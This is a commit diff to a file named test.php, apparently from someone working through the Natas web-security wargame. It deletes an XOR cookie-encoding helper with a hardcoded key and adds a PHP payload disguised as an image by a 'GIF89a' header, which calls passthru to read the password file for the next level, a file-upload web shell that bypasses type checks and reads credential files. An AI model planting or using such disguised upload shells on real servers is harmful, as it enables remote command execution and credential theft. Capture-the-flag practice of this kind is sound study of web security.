3ca89c1bf07ba60b8a13e7d02e209cb2307ab8e2
Shunsuke Ito <t22j209ai@ous.jp>
2024-03-05 00:14:20 +0900

    update

--- test.php
+++ test.php
@@ -1,18 +1,4 @@
-<?
-$defaultdata = array( "showpassword"=>"no", "bgcolor"=>"#ffffff");
-
-function xor_encrypt($in) {
-    $key = base64_decode('MGw7JCQ5OC04PT8jOSpqdmk3LT9pYmouLC0nICQ8anZpbS4qLSguKmkz');
-    $text = $in;
-    $outText = '';
-
-    // Iterate through each character
-    for($i=0;$i<strlen($text);$i++) {
-    $outText .= $text[$i] ^ $key[$i % strlen($key)];
-    }
-
-    return $outText;
-}
-print xor_encrypt(json_encode($defaultdata));
-print "\n";
+GIF89a
+<?php
+passthru('cat /etc/natas_webpass/natas14');
 ?>
